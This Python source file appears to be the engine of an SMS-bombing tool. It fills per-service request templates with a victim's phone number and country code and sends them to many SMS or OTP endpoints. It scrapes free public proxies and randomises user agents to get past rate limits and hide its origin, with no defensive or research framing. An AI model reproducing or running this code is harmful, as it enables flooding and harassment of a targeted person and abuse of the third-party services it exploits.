import json
import random
import requests
from lxml.html import fromstring


def get_services():
    return json.load(open('apidata.json', 'r')).get('sms')


def get_proxies():
    url = 'https://free-proxy-list.net/'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:500]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            # Grabbing IP and corresponding PORT
            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies


def format_config(config, cc, target):
    temp_json = json.dumps(config)
    temp_json = temp_json.replace('{target}', target)
    temp_json = temp_json.replace('{cc}', cc)
    return json.loads(temp_json)


def random_agent():
    agents = json.load(open('agents.json', 'r')).get('agents')
    return random.choice(agents)


def send_sms(config, cc, target, proxy=None):
    base_headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "User-agent": random_agent()
    }

    if 'headers' in config:
        config['headers'].update(base_headers)
    else:
        config['headers'] = base_headers

    config = format_config(config, cc, target)
    url = config['url']
    data, params, json_t, headers = None, None, None, None
    if 'data' in config:
        data = config['data']
    if 'params' in config:
        params = config['params']
    if 'json' in config:
        json_t = config['json']
    if 'headers' in config:
        headers = config['headers']
    try:
        response = requests.post(url=url, timeout=1, data=data, params=params, json=json_t, headers=headers, proxies=proxy)
        print(response.status_code)
        if response.status_code >= 400:
            print(url)
        return response.status_code == 200 or response.status_code == 201
    except Exception as e:
        print(e)
        return False
